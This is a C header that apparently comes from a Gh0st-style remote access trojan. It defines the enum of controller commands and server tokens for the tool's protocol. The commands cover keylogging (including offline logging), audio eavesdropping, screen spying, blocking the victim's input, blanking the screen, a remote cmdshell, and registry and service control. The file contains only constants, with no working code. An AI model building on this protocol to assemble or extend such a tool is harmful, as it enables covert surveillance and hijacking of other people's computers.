
#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED

// BYTE最大也就256
enum
{
	// 文件传输方式
	TRANSFER_MODE_NORMAL = 0x00,	// 一般,如果本地或者远程已经有，取消
	TRANSFER_MODE_ADDITION,			// 追加
	TRANSFER_MODE_ADDITION_ALL,		// 全部追加
	TRANSFER_MODE_OVERWRITE,		// 覆盖
	TRANSFER_MODE_OVERWRITE_ALL,	// 全部覆盖
	TRANSFER_MODE_JUMP,				// 覆盖
	TRANSFER_MODE_JUMP_ALL,			// 全部覆盖
	TRANSFER_MODE_CANCEL,			// 取消传送
	
	// 控制端发出的命令
	COMMAND_ACTIVED = 0x00,			// 服务端可以激活开始工作
	COMMAND_LIST_DRIVE,				// 列出磁盘目录
	COMMAND_LIST_FILES,				// 列出目录中的文件
	COMMAND_DOWN_FILES,				// 下载文件
	COMMAND_FILE_SIZE,				// 上传时的文件大小
	COMMAND_FILE_DATA,				// 上传时的文件数据
	COMMAND_EXCEPTION,				// 传输发生异常，需要重新传输
	COMMAND_CONTINUE,				// 传输正常，请求继续发送数据
	COMMAND_STOP,					// 传输中止
	COMMAND_DELETE_FILE,			// 删除文件
	COMMAND_DELETE_DIRECTORY,		// 删除目录
	COMMAND_SET_TRANSFER_MODE,		// 设置传输方式
	COMMAND_CREATE_FOLDER,			// 创建文件夹
	COMMAND_RENAME_FILE,			// 文件或文件改名
	COMMAND_OPEN_FILE_SHOW,			// 显示打开文件
	COMMAND_OPEN_FILE_HIDE,			// 隐藏打开文件
	
	COMMAND_SCREEN_SPY,				// 屏幕查看
	COMMAND_SCREEN_RESET,			// 改变屏幕深度
	COMMAND_ALGORITHM_RESET,		// 改变算法
	COMMAND_SCREEN_CTRL_ALT_DEL,	// 发送Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// 屏幕控制
	COMMAND_SCREEN_BLOCK_INPUT,		// 锁定服务端键盘鼠标输入
	COMMAND_SCREEN_BLANK,			// 服务端黑屏
	COMMAND_SCREEN_CAPTURE_LAYER,	// 捕捉层
	COMMAND_SCREEN_GET_CLIPBOARD,	// 获取远程剪贴版
	COMMAND_SCREEN_SET_CLIPBOARD,	// 设置远程剪帖版

	COMMAND_NEXT,				// 下一步(控制端已经打开对话框)

	COMMAND_KEYBOARD,				// 键盘记录
	COMMAND_KEYBOARD_OFFLINE,		// 开启离线键盘记录
	COMMAND_KEYBOARD_CLEAR,			// 清除键盘记录内容

	COMMAND_AUDIO,					// 语音监听

	COMMAND_SYSTEM,					// 系统管理（进程，窗口....）
	COMMAND_PSLIST,					// 进程列表
	COMMAND_WSLIST,					// 窗口列表
	COMMAND_KILLPROCESS,			// 关闭进程
	COMMAND_WINDOW_CLOSE,			// 关闭窗口
	COMMAND_WINDOW_TEST,			// 操作窗口

	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// 会话管理（关机，重启，注销, 卸载）

	COMMAND_REPLAY_HEARTBEAT,		// 回复心跳包
	COMMAND_SERVICES,				// 服务管理
	COMMAND_SERVICELIST,            // 刷新服务列表        
	COMMAND_SERVICECONFIG,			// 服务端发出的标识

	// 服务管理的操作
	COMMAND_SERVICES_START = 0x01,	// 启动服务
	COMMAND_SERVICES_STOP,			// 停止服务
	COMMAND_SERVICES_AUTO,			// 启动方式 - 自动启动
	COMMAND_SERVICES_MANUAL,		// 启动方式 - 手动启动

	COMMAND_REGEDIT,				//注册表管理
	COMMAND_REG_FIND,				//注册表 管理标识

	// 服务端发出的标识
	TOKEN_AUTH = 100,				// 要求验证
	TOKEN_HEARTBEAT,				// 心跳包
	TOKEN_LOGIN,					// 上线包
	TOKEN_DRIVE_LIST,				// 驱动器列表
	TOKEN_FILE_LIST,				// 文件列表
	TOKEN_FILE_SIZE,				// 文件大小，传输文件时用
	TOKEN_FILE_DATA,				// 文件数据
	TOKEN_TRANSFER_FINISH,			// 传输完毕
	TOKEN_DELETE_FINISH,			// 删除完毕
	TOKEN_GET_TRANSFER_MODE,		// 得到文件传输方式
	TOKEN_GET_FILEDATA,				// 远程得到本地文件数据
	TOKEN_CREATEFOLDER_FINISH,		// 创建文件夹任务完成
	TOKEN_DATA_CONTINUE,			// 继续传输数据
	TOKEN_RENAME_FINISH,			// 改名操作完成
	TOKEN_EXCEPTION,				// 操作发生异常
	
	TOKEN_BITMAPINFO,				// 屏幕查看的BITMAPINFO
	TOKEN_FIRSTSCREEN,				// 屏幕查看的第一张图
	TOKEN_NEXTSCREEN,				// 屏幕查看的下一张图
	TOKEN_CLIPBOARD_TEXT,			// 屏幕查看时发送剪帖版内容


	//TOKEN_WEBCAM_BITMAPINFO,		// 摄像头的BITMAPINFOHEADER
	//TOKEN_WEBCAM_DIB,				// 摄像头的图像数据
	
	TOKEN_AUDIO_START,				// 开始语音监听
	TOKEN_AUDIO_DATA,				// 语音监听数据

	TOKEN_KEYBOARD_START,			// 键盘记录开始
	TOKEN_KEYBOARD_DATA,			// 键盘记录的数据
	
	TOKEN_PSLIST,					// 进程列表
	TOKEN_WSLIST,					// 窗口列表
	//TOKEN_DIALUPASS,				// 拨号密码
	TOKEN_SHELL_START,				// 远程终端开始
	TOKEN_SERVERLIST,				// 服务列表
	TOKEN_REGEDIT,                  // 注册表初始化完毕
	TOKEN_REG_PATH,                 // 注册表项缓冲区
	TOKEN_REG_KEY                   // 注册表缓冲区
};


#define	MAX_WRITE_RETRY			15			// 重试写入文件次数
#define	MAX_SEND_BUFFER			1024 * 16	// 最大发送数据长度
#define MAX_RECV_BUFFER			1024 * 16	// 最大接收数据长度



#endif // !defined(AFX_MACROS_H_INCLUDED)